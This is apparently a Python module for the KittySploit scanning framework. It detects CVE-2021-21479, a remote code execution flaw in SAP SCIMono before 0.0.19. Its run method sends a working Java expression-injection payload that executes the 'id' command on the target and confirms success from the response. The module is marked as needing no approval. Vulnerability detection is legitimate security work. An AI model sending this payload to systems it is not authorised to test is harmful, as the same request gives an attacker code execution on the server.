#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SCIMono before 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SCIMono <0.0.19 - Remote Code Execution Detection',
        'description': 'SCIMono before 0.0.19 is vulnerable to remote code execution because it is possible for an attacker to inject and execute java expressions and compromise the availability and integrity of the system.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'scimono', 'rce', 'sap', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://securitylab.github.com/advisories/GHSL-2020-227-scimono-ssti/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-21479',
            'https://github.com/SAP/scimono/security/advisories/GHSA-29q4-gxjq-rx5c',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-21479',
    }

    def run(self):
        r = self.http_request(method="GET", path='/Schemas/$%7B\'\'.class.forName(\'javax.script.ScriptEngineManager\').newInstance().getEngineByName(\'js\').eval(\'java.lang.Runtime.getRuntime().exec("id")\')%7D', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('The attribute value', 'java.lang.UNIXProcess@', 'has invalid value!', '"status" : "400"',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="SCIMono <0.0.19 - Remote Code Execution detected",
                path='/Schemas/$%7B\'\'.class.forName(\'javax.script.ScriptEngineManager\').newInstance().getEngineByName(\'js\').eval(\'java.lang.Runtime.getRuntime().exec("id")\')%7D',
            )
            return True
        return False

